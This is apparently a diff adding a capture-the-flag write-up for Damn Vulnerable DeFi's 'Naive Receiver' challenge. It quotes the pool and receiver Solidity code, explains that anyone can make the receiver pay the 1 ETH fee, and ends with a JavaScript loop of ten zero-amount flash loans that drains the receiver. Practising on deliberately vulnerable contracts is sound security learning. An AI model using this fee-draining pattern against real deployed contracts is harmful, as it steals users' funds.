@@ -92,3 +92,85 @@ The exploit lies in the ```destroy()``` method.  This is public, so anyone can c
 
 ### Damn Vulnerable DeFi #2 Naive Receiver
 
+This challenge is again on Flash Loan pools.  There is a pool (NaiveReceiverLenderPool) with 1000 ETH to loan out and for each borrow a fee of 1ETH is paid.  A user has deployed a contract (FlashLoanReceiver) to interact with the pool.  Our objective is to drain the user's contract (in one transaction if possible).  
+
+Let's take a look at how Flash Loans are taken out in NaiveReceiverLenderPool.sol:  
+
+```Java
+    function flashLoan(
+        IERC3156FlashBorrower receiver,
+        address token,
+        uint256 amount,
+        bytes calldata data
+    ) external returns (bool) {
+        if (token != ETH)
+            revert UnsupportedCurrency();
+        
+        uint256 balanceBefore = address(this).balance;
+
+        // Transfer ETH and handle control to receiver
+        SafeTransferLib.safeTransferETH(address(receiver), amount);
+        if(receiver.onFlashLoan(
+            msg.sender,
+            ETH,
+            amount,
+            FIXED_FEE,
+            data
+        ) != CALLBACK_SUCCESS) {
+            revert CallbackFailed();
+        }
+
+        if (address(this).balance < balanceBefore + FIXED_FEE)
+            revert RepayFailed();
+
+        return true;
+    }
+```
+
+A user calls flashLoan() with the receiver, a token and, some data, and the amount to be borrowed.  As with most Flash Loans there is a check to make sure the loan was paid back at the end.  Now let's take a look at the receiver.  
+
+```Java
+    function onFlashLoan(
+        address,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata
+    ) external returns (bytes32) {
+        assembly { // gas savings
+            if iszero(eq(sload(pool.slot), caller())) {
+                mstore(0x00, 0x48f5c3ed)
+                revert(0x1c, 0x04)
+            }
+        }
+        
+        if (token != ETH)
+            revert UnsupportedCurrency();
+        
+        uint256 amountToBeRepaid;
+        unchecked {
+            amountToBeRepaid = amount + fee;
+        }
+
+        _executeActionDuringFlashLoan();
+
+        // Return funds to pool
+        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    // Internal function where the funds received would be used
+    function _executeActionDuringFlashLoan() internal { }
+```
+
+The only thing that looks suspicious to me is the unchecked ```amountToBeRepaid``` calculation, since there are no checks on these values there is some potential for over/underflow.  ```SafeTransferLib.safeTransferETH()``` is used in both the pool and the receiver, this will revert if too large of an amount is requested.  There is no check that the amount borrowed is greater than zero, so we could borrow 0 Ether 10 times and have drain the contract.  Another item of note is that the receiver pays back the amount from the function call, not checking if that was actually the amount received.  
+
+Code doing this is shown below.  
+```Javascript
+        await pool.connect(player); 
+
+        for (let i=0; i<10; i++) {
+            await pool.flashLoan(receiver.address, pool.ETH(), 0, "0x");
+        }
+```
